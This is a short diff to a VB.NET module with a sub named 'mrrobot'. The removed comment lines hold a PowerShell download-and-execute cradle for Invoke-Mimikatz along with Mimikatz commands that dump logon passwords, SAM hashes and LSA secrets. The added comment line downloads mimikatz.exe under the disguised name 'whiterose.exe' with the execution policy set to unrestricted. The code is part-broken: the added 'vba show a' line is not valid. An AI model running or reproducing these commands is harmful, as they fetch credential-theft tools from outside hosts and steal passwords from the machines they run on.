@@ -19,11 +19,9 @@ Module Program
     Sub mrrobot()
 
         'Decode Base64
-        'IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
-        'Invoke-Mimikatz - DumpCreds #Dump creds from memory
-        'Invoke-Mimikatz - Command() '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
+        'powershell -NoProfile -ExecutionPolicy unrestricted -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -OutFile 'whiterose.exe' -useb 'https://raw.githubusercontent.com/ParrotSec/mimikatz/master/Win32/mimikatz.exe'"
 
-
+        vba show a
 
     End Sub
 
